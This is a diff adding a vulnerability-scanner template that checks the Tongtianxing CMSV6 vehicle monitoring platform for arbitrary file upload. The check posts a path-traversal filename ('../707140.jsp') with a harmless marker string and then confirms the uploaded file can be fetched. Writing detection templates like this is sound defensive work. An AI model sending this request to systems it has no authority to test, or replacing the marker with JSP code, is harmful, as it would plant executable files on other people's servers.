@@ -1,0 +1,51 @@
+id: tongtianxing-inspect_file-upload
+
+info:
+  name: 通天星CMSV6车载主动安全监控云平台upload接口存在任意文件上传漏洞
+  author: tongtianxing
+  severity: high
+  tags: tongtianxing
+
+http:
+  - raw:
+      - |
+        POST /inspect_file/upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----2e7688d712bcc913201f327059f9976b
+
+        ------2e7688d712bcc913201f327059f9976b
+        Content-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"
+        Content-Type: application/octet-stream
+        
+        outp2ris31p607
+        ------2e7688d712bcc913201f327059f9976b--
+
+      - |+
+        GET {{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - '"filePath":"(.*?\.jsp)",'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'outp2ris31p607'
+    matchers-condition: and
